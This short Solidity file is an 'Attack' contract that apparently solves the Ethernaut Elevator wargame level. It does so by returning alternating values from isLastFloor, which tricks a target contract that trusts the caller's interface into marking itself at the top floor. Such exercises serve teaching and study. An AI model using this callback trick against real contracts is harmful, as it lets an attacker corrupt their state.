// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// The instance itself calls "building" two times 
// First time should be false to enter the if statement and second one true to declare the top
// We can create a counter so that isLastFloor returns true every second call

interface IElevator {
    function goTo(uint _floor) external;
}

contract Attack {
    uint256 count;
    IElevator elevator;

    constructor(address _elevator) public {
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        count++;
        if (count % 2 != 0) {
            return false;
        } else {
            return true;
        }
    }    

    function attack() public {
        elevator.goTo(10);
    }
}
